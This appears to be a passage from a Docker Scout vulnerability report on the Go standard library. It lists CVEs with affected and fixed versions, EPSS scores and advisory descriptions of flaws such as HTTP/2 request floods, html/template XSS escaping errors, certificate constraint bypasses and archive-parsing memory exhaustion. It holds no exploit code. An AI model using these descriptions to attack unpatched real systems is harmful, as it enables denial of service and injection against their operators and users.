Calling Parse on a "// +build" build tag line with deeply nested expressions can cause a panic due to stack exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34156?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2024--34156" src="https://img.shields.io/badge/CVE--2024--34156-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.127%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24791?s=golang&n=stdlib&t=golang&vr=%3C1.21.12"><img alt="high : CVE--2024--24791" src="https://img.shields.io/badge/CVE--2024--24791-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.414%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>73rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/http HTTP/1.1 client mishandled the case where a server responds to a request with an "Expect: 100-continue" header with a non-informational (200 or higher) status. This mishandling could leave a client connection in an invalid state, where the next request sent on the connection will fail.

An attacker sending a request to a net/http/httputil.ReverseProxy proxy can exploit this mishandling to cause a denial of service by sending "Expect: 100-continue" requests which elicit a non-informational response from the backend. Each such request leaves the proxy with an invalid connection, and causes one subsequent request using that connection to fail.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24784?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="high : CVE--2024--24784" src="https://img.shields.io/badge/CVE--2024--24784-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ParseAddressList function incorrectly handles comments (text within parentheses) within display names. Since this is a misalignment with conforming address parsers, it can result in different trust decisions being made by programs using different parsers.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45288?s=golang&n=stdlib&t=golang&vr=%3C1.21.9"><img alt="high : CVE--2023--45288" src="https://img.shields.io/badge/CVE--2023--45288-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>89.455%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames.

Maintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed.

This permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send.

The fix sets a limit on the amount of excess header frames we will process before closing a connection.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45283?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"><img alt="high : CVE--2023--45283" src="https://img.shields.io/badge/CVE--2023--45283-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.345%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The filepath package does not recognize paths with a \??\ prefix as special.

On Windows, a path beginning with \??\ is a Root Local Device path equivalent to a path beginning with \\?\. Paths with a \??\ prefix may be used to access arbitrary locations on the system. For example, the path \??\c:\x is equivalent to the more common path c:\x.

Before fix, Clean could convert a rooted path such as \a\..\??\b into the root local device path \??\b. Clean will now convert this to .\??\b.

Similarly, Join(\, ??, b) could convert a seemingly innocent sequence of path elements into the root local device path \??\b. Join will now convert this to \.\??\b.

In addition, with fix, IsAbs now correctly reports paths beginning with \??\ as absolute, and VolumeName correctly reports the \??\ prefix as a volume name.

UPDATE: Go 1.20.11 and Go 1.21.4 inadvertently changed the definition of the volume name in Windows paths starting with \?, resulting in filepath.Clean(\?\c:) returning \?\c: rather than \?\c:\ (among other effects). The previous behavior has been restored.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-44487?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"><img alt="high : CVE--2023--44487" src="https://img.shields.io/badge/CVE--2023--44487-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>99.999%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing.

With the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection.

This issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2.

The default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39325?s=golang&n=stdlib&t=golang&vr=%3C1.20.10"><img alt="high : CVE--2023--39325" src="https://img.shields.io/badge/CVE--2023--39325-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.796%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing.

With the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection.

This issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2.

The default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-30635?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2022--30635" src="https://img.shields.io/badge/CVE--2022--30635-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.915%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-111943?s=golang&n=stdlib&t=golang&vr=%3C1.26.10"><img alt="medium : CVE--2026--111943" src="https://img.shields.io/badge/CVE--2026--111943-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.396%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On most platforms, Go uses the given system root certificates. However, in some narrower cases, the system trust stores may not be updated without further action.

To defend against the narrower set of cases that may remain affected, a denylist was added in crypto/x509 to return an error when calling Verify with any of the known intermediate certificates that are no longer considered to be trustworthy.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4673?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"><img alt="medium : CVE--2025--4673" src="https://img.shields.io/badge/CVE--2025--4673-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.669%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin redirects potentially leaking sensitive information.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27145?s=golang&n=stdlib&t=golang&vr=%3C1.25.11"><img alt="medium : CVE--2026--27145" src="https://img.shields.io/badge/CVE--2026--27145-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.591%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

(*x509.Certificate).VerifyHostname previously called matchHostnames in a loop over all DNS Subject Alternative Name (SAN) entries. This caused strings.Split(host, ".") to execute repeatedly on the same input hostname.

With a large DNS SAN list, verification costs scaled quadratically based on the number of SAN entries multiplied by the hostname's label count. Because x509.Verify validates hostnames before building the certificate chain, this overhead occurred even for untrusted certificates.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61728?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61728" src="https://img.shields.io/badge/CVE--2025--61728-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.738%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

archive/zip uses a super-linear file name indexing algorithm that is invoked the first time a file in an archive is opened. This can lead to a denial of service when consuming a maliciously constructed ZIP archive.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61727?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="medium : CVE--2025--61727" src="https://img.shields.io/badge/CVE--2025--61727-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.304%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An excluded subdomain constraint in a certificate chain does not restrict the usage of wildcard SANs in the leaf certificate. For example a constraint that excludes the subdomain test.example.com does not prevent a leaf certificate from claiming the SAN *.example.com.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47906?s=golang&n=stdlib&t=golang&vr=%3C1.23.12"><img alt="medium : CVE--2025--47906" src="https://img.shields.io/badge/CVE--2025--47906-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.550%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If the PATH environment variable contains paths which are executables (rather than just directories), passing certain strings to LookPath ("", ".", and ".."), can result in the binaries listed in the PATH being unexpectedly returned.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-45290?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2023--45290" src="https://img.shields.io/badge/CVE--2023--45290-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.165%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When parsing a multipart form (either explicitly with Request.ParseMultipartForm or implicitly with Request.FormValue, Request.PostFormValue, or Request.FormFile), limits on the total size of the parsed form were not applied to the memory consumed while reading a single form line. This permits a maliciously crafted input containing very long lines to cause allocation of arbitrarily large amounts of memory, potentially leading to memory exhaustion.

With fix, the ParseMultipartForm function now correctly limits the maximum size of form lines.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32282?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="medium : CVE--2026--32282" src="https://img.shields.io/badge/CVE--2026--32282-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.297%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Linux, if the target of Root.Chmod is replaced with a symlink while the chmod operation is in progress, Chmod can operate on the target of the symlink, even when the target lies outside the root.

The Linux fchmodat syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses to avoid symlink traversal. Root.Chmod checks its target before acting and returns an error if the target is a symlink lying outside the root, so the impact is limited to cases where the target is replaced with a symlink between the check and operation.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97030?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="medium : CVE--2026--97030" src="https://img.shields.io/badge/CVE--2026--97030-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.289%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A trusted template author may have previously written a valid template wherein the use of the 'yield' keyword would not be correctly escaped.

We now ensure that valid keyword uses are escaped and non-keyword uses are not escaped.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-94448?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="medium : CVE--2026--94448" src="https://img.shields.io/badge/CVE--2026--94448-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.289%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When a JavaScript template literal contains consecutive expressions, the context tracking state was not properly reset upon entering a new expression.

We now ensure that template-literal expression entries correctly reset context variables so all subsequent regular expression literals are accurately recognized and escaped.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56858?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="medium : CVE--2026--56858" src="https://img.shields.io/badge/CVE--2026--56858-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.310%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Previously, pathological inputs could close an unescaped '/' early, allowing for attack-controlled data to inject arbitrary content, potentially leading to XSS.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39826?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="medium : CVE--2026--39826" src="https://img.shields.io/badge/CVE--2026--39826-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.371%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If a trusted template author were to write a <script> tag containing an empty 'type' attribute or a 'type' attribute with an ASCII whitespace, the execution of the template would incorrectly escape any data passed into the <script> block.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39823?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="medium : CVE--2026--39823" src="https://img.shields.io/badge/CVE--2026--39823-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.314%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped inside of a <meta> tag's <content> attribute. If the URL content were to insert ASCII whitespaces around the '=' rune inside of the <content> attribute, the escaper would fail to similarly escape it, leading to XSS.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32289?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="medium : CVE--2026--32289" src="https://img.shields.io/badge/CVE--2026--32289-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.295%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Context was not properly tracked across template branches for JS template literals, leading to possibly incorrect escaping of content when branches were used. Additionally template actions within JS template literals did not properly track the brace depth, leading to incorrect escaping being applied.

These issues could cause actions within JS template literals to be incorrectly or improperly escaped, leading to XSS vulnerabilities.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27142?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="medium : CVE--2026--27142" src="https://img.shields.io/badge/CVE--2026--27142-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.374%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Actions which insert URLs into the content attribute of HTML meta tags are not escaped. This can allow XSS if the meta tag also has an http-equiv attribute with the value "refresh".

A new GODEBUG setting has been added, htmlmetacontenturlescape, which can be used to disable escaping URLs in actions in the meta content attribute which follow "url=" by setting htmlmetacontenturlescape=0.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45341?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"><img alt="medium : CVE--2024--45341" src="https://img.shields.io/badge/CVE--2024--45341-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.556%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A certificate with a URI which has a IPv6 address with a zone ID may incorrectly satisfy a URI name constraint that applies to the certificate chain.

Certificates containing URIs are not permitted in the web PKI, so this only affects users of private PKIs which make use of URIs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45336?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"><img alt="medium : CVE--2024--45336" src="https://img.shields.io/badge/CVE--2024--45336-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.710%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The HTTP client drops sensitive headers after following a cross-domain redirect. For example, a request to a.com/ containing an Authorization header which is redirected to b.com/ will not send that header to b.com.

In the event that the client received a subsequent same-domain redirect, however, the sensitive headers would be restored. For example, a chain of redirects from a.com/, to b.com/1, and finally to b.com/2 would incorrectly send the Authorization header to b.com/2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39319?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"><img alt="medium : CVE--2023--39319" src="https://img.shields.io/badge/CVE--2023--39319-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.911%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The html/template package does not apply the proper rules for handling occurrences of "<script", "<!--", and "</script" within JS literals in <script> contexts. This may cause the template parser to improperly consider script contexts to be terminated early, causing actions to be improperly escaped. This could be leveraged to perform an XSS attack.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39318?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"><img alt="medium : CVE--2023--39318" src="https://img.shields.io/badge/CVE--2023--39318-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.20.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.930%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The html/template package does not properly handle HTML-like "" comment tokens, nor hashbang "#!" comment tokens, in <script> contexts. This may cause the template parser to improperly interpret the contents of <script> contexts, causing actions to be improperly escaped. This may be leveraged to perform an XSS attack.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56860?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="medium : CVE--2026--56860" src="https://img.shields.io/badge/CVE--2026--56860-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.550%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Previously, resolving relative paths containing parent directory ('..') segments performed string conversions and buffer rewrites on each step, resulting in quadratic time complexity and high memory allocation overhead.

Now, path resolution operates on a byte buffer using index-based backtracking for '..' segments, eliminating the quadratic time complexity and significantly reducing memory allocations.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24783?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2024--24783" src="https://img.shields.io/badge/CVE--2024--24783-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.667%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Verifying a certificate chain which contains a certificate with an unknown public key algorithm will cause Certificate.Verify to panic.

This affects all crypto/tls clients, and servers that set Config.ClientAuth to VerifyClientCertIfGiven or RequireAndVerifyClientCert. The default behavior is for TLS servers to not verify client certificates.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32288?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="medium : CVE--2026--32288" src="https://img.shields.io/badge/CVE--2026--32288-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.295%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

tar.Reader can allocate an unbounded amount of memory when reading a maliciously-crafted archive containing a large number of sparse regions encoded in the "old GNU sparse map" format.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0913?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"><img alt="medium : CVE--2025--0913" src="https://img.shields.io/badge/CVE--2025--0913-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.327%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on Unix and Windows systems when the target path was a dangling symlink. On Unix systems, OpenFile with O_CREATE and O_EXCL flags never follows symlinks. On Windows, when the target path was a symlink to a nonexistent location, OpenFile would create a file in that location. OpenFile now always returns an error when the O_CREATE and O_EXCL flags are both set and the target path is a symlink.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24789?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"><img alt="medium : CVE--2024--24789" src="https://img.shields.io/badge/CVE--2024--24789-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.443%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The archive/zip package's handling of certain types of invalid zip files differs from the behavior of most zip implementations. This misalignment could be exploited to create an zip file with contents that vary depending on the implementation reading the file. The archive/zip package now rejects files containing these errors.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24785?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2024--24785" src="https://img.shields.io/badge/CVE--2024--24785-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.795%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If errors returned from MarshalJSON methods contain user controlled data, they may be used to break the contextual auto-escaping behavior of the html/template package, allowing for subsequent actions to inject unexpected content into templates.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42507?s=golang&n=stdlib&t=golang&vr=%3C1.25.11"><img alt="medium : CVE--2026--42507" src="https://img.shields.io/badge/CVE--2026--42507-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.370%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When returning errors, functions in the net/textproto package would include its input as part of the error. This might allow an attacker to inject misleading content to errors that are printed or logged.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42505?s=golang&n=stdlib&t=golang&vr=%3C1.25.12"><img alt="medium : CVE--2026--42505" src="https://img.shields.io/badge/CVE--2026--42505-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.382%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Handshakes which used Encrypted Client Hello could be de-anonymized by a passive network observer due to a disclosure of pre-shared key identities in the unencrypted client hello.

</blockquote>
</details>

